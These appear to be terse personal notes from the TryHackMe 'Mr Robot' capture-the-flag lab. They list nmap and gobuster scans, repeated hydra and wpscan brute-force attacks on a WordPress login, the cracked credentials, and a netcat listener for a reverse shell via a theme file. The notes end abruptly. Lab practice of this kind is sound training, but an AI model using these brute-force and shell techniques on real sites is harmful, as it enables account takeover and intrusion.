# THM - Mr Robot CTF

IP 10.10.162.6

```shell
nmap -sV -sC -oA scans/initial 10.10.162.6

less scans/initial.nmap
```

http://10.10.162.6/robots.txt

http://10.10.162.6/fsocity.dic

http://10.10.162.6/key-1-of-3.txt

```shell
gobuster dir -u http://10.10.162.6/ -w ../KaliWordLists/dirbuster/directory-list-2.3-small.txt -t 100 -q -o scans/gobuster-small.txt

less scans/gobuster-small.txt
```

http://10.10.162.6/wp-login

http://10.10.162.6/license

http://10.10.162.6/sitemap

http://10.10.162.6/intro

http://10.10.162.6/readme

foxyproxy

```shell
hydra -L fsocity.dic -p test 10.10.162.6 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30

hydra -l Elliot -P fsocity.dic 10.10.162.6 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username Elliot is incorrect." -t 30

hydra -l Elliot -P fsocity.dic 10.10.162.6 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30
```

#password: ER28–0652

```shell
sort  fsocity.dic | uniq > fsocity.dic.uniq

hydra -L fsocity.dic.uniq -p nopass -s 80 10.10.162.6 http-post-form -t 30 '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username' 

hydra -l Elliot -P fsocity.dic.uniq -s 80 10.10.162.6 http-post-form -t 30 '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username'

hydra -l Elliot -P fsocity.dic 10.10.162.6 http-post-form "/login.php:user=^USER^&pass=^PASS^:incorrect" -t 30


wpscan --url 10.10.162.6 --wp-content-dir wp-admin --usernames elliot --passwords fsocity.dic.uniq
```

username: elliot
password: ER28-0652

```shell
sudo rlwrap nc -lvnp 53

http://10.10.162.6/wp-content/themes/twentyfifteen/archive.php

curl -s http://10.10.162.6/license | tr -d "\n"
```

MERDA!!!!!!!!!
